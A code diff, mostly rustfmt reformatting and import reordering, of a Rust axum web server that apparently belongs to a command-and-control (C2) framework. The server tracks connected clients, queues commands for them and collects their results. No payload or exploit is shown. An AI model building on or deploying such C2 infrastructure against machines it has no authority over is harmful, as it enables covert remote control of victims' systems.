@@ -1,19 +1,19 @@
-use std::collections::HashMap;
-use std::sync::Arc;
-use tokio::sync::RwLock;
+use askama::Template;
 use axum::{
+    Json, Router,
     extract::{Path, State},
     http::StatusCode,
     response::Html,
     routing::{get, post},
-    Json, Router,
 };
-use tower_http::{cors::CorsLayer, services::ServeDir};
-use askama::Template;
-use serde_json;
 use serde::{Deserialize, Serialize};
+use serde_json;
+use std::collections::HashMap;
+use std::net::TcpListener as StdTcpListener;
+use std::sync::Arc;
 use tokio::net::TcpListener as TokioTcpListener; // Alias Tokio's TcpListener
-use std::net::TcpListener as StdTcpListener; // Import Std TcpListener
+use tokio::sync::RwLock;
+use tower_http::{cors::CorsLayer, services::ServeDir}; // Import Std TcpListener
 
 // 引入common模块
 use rust_c2_framework::common::*;
@@ -110,7 +110,8 @@ async fn handle_command_result(
 ) -> Result<StatusCode, StatusCode> {
     if let Ok(result) = serde_json::from_slice::<CommandResponse>(&message.payload) {
         let mut results = state.command_results.write().await;
-        results.entry(result.client_id.clone())
+        results
+            .entry(result.client_id.clone())
             .or_insert_with(Vec::new)
             .push(result);
         Ok(StatusCode::OK)
@@ -135,16 +136,21 @@ async fn index(State(state): State<ServerState>) -> Result<Html<String>, StatusC
     let clients = state.clients.read().await;
     let current_timestamp = chrono::Utc::now().timestamp();
 
-    let display_clients: Vec<DisplayClientInfo> = clients.values().cloned().map(|c| {
-        let is_online = (current_timestamp - c.last_seen.timestamp()) < 60;
-        DisplayClientInfo {
-            client_info: c,
-            is_online,
-        }
-    }).collect();
-    
+    let display_clients: Vec<DisplayClientInfo> = clients
+        .values()
+        .cloned()
+        .map(|c| {
+            let is_online = (current_timestamp - c.last_seen.timestamp()) < 60;
+            DisplayClientInfo {
+                client_info: c,
+                is_online,
+            }
+        })
+        .collect();
+
     let online_clients_count = display_clients.iter().filter(|c| c.is_online).count();
-    let os_types_count = display_clients.iter()
+    let os_types_count = display_clients
+        .iter()
         .map(|c| c.client_info.os.as_str())
         .collect::<std::collections::HashSet<_>>()
         .len();
@@ -154,13 +160,13 @@ async fn index(State(state): State<ServerState>) -> Result<Html<String>, StatusC
         online_clients_count,
         os_types_count, // Pass the calculated count
     };
-    
+
     match template.render() {
         Ok(html) => Ok(Html(html)),
         Err(e) => {
             eprintln!("Template rendering error: {:?}", e);
             Err(StatusCode::INTERNAL_SERVER_ERROR)
-        },
+        }
     }
 }
 
@@ -171,17 +177,15 @@ async fn client_detail(
 ) -> Result<Html<String>, StatusCode> {
     let clients = state.clients.read().await;
     let command_results = state.command_results.read().await;
-    
+
     if let Some(client) = clients.get(&client_id) {
-        let commands = command_results.get(&client_id)
-            .cloned()
-            .unwrap_or_default();
-        
+        let commands = command_results.get(&client_id).cloned().unwrap_or_default();
+
         let template = ClientTemplate {
             client: client.clone(),
             commands,
         };
-        
+
         match template.render() {
             Ok(html) => Ok(Html(html)),
             Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
@@ -198,12 +202,10 @@ async fn send_command(
     Json(mut cmd): Json<CommandRequest>,
 ) -> Result<StatusCode, StatusCode> {
     cmd.client_id = client_id.clone();
-    
+
     let mut commands = state.commands.write().await;
-    commands.entry(client_id)
-        .or_insert_with(Vec::new)
-        .push(cmd);
-    
+    commands.entry(client_id).or_insert_with(Vec::new).push(cmd);
+
     Ok(StatusCode::OK)
 }
 
@@ -220,9 +222,7 @@ async fn api_command_results(
     Path(client_id): Path<String>,
 ) -> Json<Vec<CommandResponse>> {
     let command_results = state.command_results.read().await;
-    let results = command_results.get(&client_id)
-        .cloned()
-        .unwrap_or_default();
+    let results = command_results.get(&client_id).cloned().unwrap_or_default();
     Json(results)
 }
 
@@ -250,12 +250,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .with_state(state);
 
     println!("C2 Server starting on http://0.0.0.0:8080");
-    
+
     let listener = TokioTcpListener::bind("0.0.0.0:8080").await?;
     let std_listener: StdTcpListener = listener.into_std()?; // Convert to std::net::TcpListener
     std_listener.set_nonblocking(true)?; // Set non-blocking for hyper
 
-    axum::Server::from_tcp(std_listener)?.serve(app.into_make_service()).await?;
+    axum::Server::from_tcp(std_listener)?
+        .serve(app.into_make_service())
+        .await?;
 
     Ok(())
 }
